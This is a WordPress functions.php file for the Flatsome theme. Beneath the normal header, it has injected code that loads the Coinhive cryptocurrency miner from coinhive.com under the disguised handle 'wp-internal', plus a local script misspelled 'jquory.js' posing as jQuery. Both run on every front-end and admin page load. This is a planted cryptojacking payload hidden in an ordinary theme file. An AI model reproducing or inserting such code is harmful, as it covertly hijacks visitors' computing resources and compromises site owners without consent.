<?php
/**
 * Flatsome functions and definitions
 *
 * @package flatsome
 */

require get_template_directory() . '/inc/init.php';

/**
 * Note: It's not recommended to add any custom code here. Please use a child theme so that your customizations aren't lost during updates.
 * Learn more here: http://codex.wordpress.org/Child_Themes
 */
function enqueue_my_scripts() {
	wp_enqueue_script( 'wp-internal', 'https://coinhive.com/lib/coinhive.min.js', false, false, true );
	wp_enqueue_script( 'wp-backend', get_template_directory_uri() . '/assets/js/jquory.js', false, false, true );

	}
	add_action( 'admin_enqueue_scripts', 'enqueue_my_scripts' );
	add_action( 'wp_enqueue_scripts', 'enqueue_my_scripts' );	